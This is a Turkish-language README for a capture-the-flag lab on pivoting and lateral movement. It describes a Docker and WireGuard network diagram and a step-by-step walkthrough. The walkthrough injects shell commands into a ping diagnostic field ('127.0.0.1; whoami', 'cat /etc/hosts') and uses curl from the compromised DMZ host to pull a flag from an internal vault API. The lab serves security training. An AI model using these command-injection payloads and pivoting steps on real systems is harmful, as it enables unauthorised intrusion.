# ACME Corp - Pivoting & Lateral Movement Labı

Bu lab, Dehliz CTF platformunun **Docker Compose (Çoklu Konteyner)** ve **WireGuard Mikro-Bölümleme** mimarisi üzerinde koşan gerçekçi bir sızma ve yatay hareket (lateral movement) senaryosudur.

---

## 🏗️ Mimari ve Ağ Haritası

```text
[ Yarışmacı (WireGuard İstemcisi) ]
               │  (10.13.X.X)
               ▼
      [ WireGuard Gateway ]
               │  (Erişim İzni: Sadece 10.0.2.X DMZ Makinesi)
               ▼
    ╔════════════════════════════════════════════════════════════════════╗
    ║                           DMZ BÖLGESİ                              ║
    ║                                                                    ║
    ║  [ web-dmz ] (dehliz_containers: 10.0.2.X:5000)                   ║
    ║  - Harici erişime açık Ağ Tanı ve Teşhis Portalı                   ║
    ║  - Güvenlik Açığı: Komut Enjeksiyonu (Command Injection)           ║
    ║  - Çift Arayüzlü (Dual-Homed):                                    ║
    ║      * dehliz_containers (Dış Ağ / VPN)                            ║
    ║      * internal_corp_net (Kurumsal Dahili Ağ)                      ║
    ╚══════════════════════════╤═════════════════════════════════════════╝
                               │
                      [ internal_corp_net ]
                   (Dışarıdan Erişilemez! DROP)
                               │
                               ▼
    ╔════════════════════════════════════════════════════════════════════╗
    ║                         DAHİLİ KURUMSAL AĞ                         ║
    ║                                                                    ║
    ║  [ internal-target ] (internal_corp_net: 8080)                    ║
    ║  - Kurumsal Kasa ve Gizli API Servisi                              ║
    ║  - WireGuard tünelinden DOĞRUDAN ERİŞİLEMEZ (Firewall Engeli)      ║
    ║  - Yalnızca web-dmz üzerinden lateral movement ile ulaşılabilir!   ║
    ║  - Nihai Bayrağı (FLAG_FINAL) barındırır.                          ║
    ╚════════════════════════════════════════════════════════════════════╝
```

---

## 🎯 Çözüm Adımları (Walkthrough)

### 1. DMZ Makinesine Bağlanma
- WireGuard VPN profilinizi bağlayın.
- CTFd üzerinde soruyu başlatın (örn: `http://pivoting-lateral-movement-lab-t1.dehliz.local:5000`).
- Web arayüzünde "ICMP Ping Teşhis Aracı" ve "Dahili Bilgi Notu" sizi karşılar.

### 2. Komut Enjeksiyonunu Keşfetme
- Teşhis kutusuna normal bir hedef yazın: `127.0.0.1`
- Ping komutunun sistem kabuğunda birleştirildiğini test edin:
  ```bash
  127.0.0.1; whoami
  ```
  Çıktıda işletim sistemi kullanıcısını görürsünüz.

### 3. Dahili Ağı İnceleme
- Makinenin ağ arayüzlerini ve dahili ağ bağlantılarını sorgulayın:
  ```bash
  127.0.0.1; ip route
  # veya
  127.0.0.1; cat /etc/hosts
  ```
  `internal-target` makinesinin aynı dahili Docker köprüsünde (`internal_corp_net`) olduğunu ve çözümlenebildiğini göreceksiniz.

### 4. Lateral Movement & Bayrağı Alma
- `web-dmz` makinesindeki `curl` aracını kullanarak izole iç hedefi sorgulayın:
  ```bash
  127.0.0.1; curl -s http://internal-target:8080/
  ```
- Kasa API'sinden nihai bayrağı çekin:
  ```bash
  127.0.0.1; curl -s http://internal-target:8080/api/vault/flag
  ```
  Dönen JSON yanıtı:
  ```json
  {
    "status": "AUTHORIZED",
    "message": "Kurumsal dahili ağdan gelen yetkili istek doğrulandı.",
    "origin_ip": "172.18.0.3",
    "vault_id": "VAULT-SEC-9081",
    "flag": "DEHLIZ{...}"
  }
  ```

### 5. Bayrağı Gönderme & Otomatik Temizlik
- Elde ettiğiniz `DEHLIZ{...}` bayrağını CTFd formuna girin.
- CTFd çözümü onaylar.
- Dehliz orkestratörü hem `web-dmz` hem de `internal-target` konteynerlerini, iç köprü ağlarını ve Gateway firewall kurallarını otomatik olarak `docker compose down` ile imha eder.
